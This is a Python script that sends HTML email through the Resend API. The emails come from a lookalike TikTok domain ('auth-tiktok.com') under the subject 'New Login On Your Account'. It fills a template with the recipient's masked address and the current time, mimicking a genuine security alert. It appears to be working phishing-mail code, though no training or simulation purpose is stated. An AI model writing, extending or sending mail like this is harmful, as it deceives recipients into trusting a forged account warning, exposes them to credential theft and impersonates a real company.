import resend
from dotenv import load_dotenv
import os
from datetime import datetime

load_dotenv()

MAIL_FROM = "no-reply@auth-tiktok.com"

SUBJECT = "New Login On Your Account"

resend.api_key = os.getenv("RESEND_API_KEY")


class Correo:
    """
    New instance of this class will need to be created every time a new email is sent.
    """

    def __init__(self, recipient_address):
        self.mail_from = MAIL_FROM
        self.subject = SUBJECT
        self.recipient_address = recipient_address
        self.recipient = [
            {"email": recipient_address}
        ]  # special formatting for MailerSend API

        self.__set_template()

    def __mask_email(self, email) -> str:
        """
        Email goes from myemail@gmail.com -> m***l@gmail.com
        """
        name, domain = email.split("@")
        if len(name) <= 2:
            masked_name = name[0] + "*" + (name[1] if len(name) > 1 else "")
        else:
            masked_name = name[0] + "***" + name[-1]
        return masked_name + "@" + domain

    def __set_template(self) -> str:
        with open("email/email-template.html", "r") as f:
            template = f.read()
        template = template.replace(
            "{masked-email}", self.__mask_email(self.recipient_address)
        )

        template = template.replace("{current-date}", get_date())
        template = template.replace("{current-time}", get_time())

        self.template = template
        return self.template

    def send(self):
        params: resend.Emails.send = {
            "from": self.mail_from,
            "to": self.recipient_address,
            "subject": self.subject,
            "html": self.template,
        }
        return resend.Emails.send(params)


def get_date():
    return datetime.now().strftime("%m/%d")


def get_time():
    return datetime.now().strftime("%H:%M")
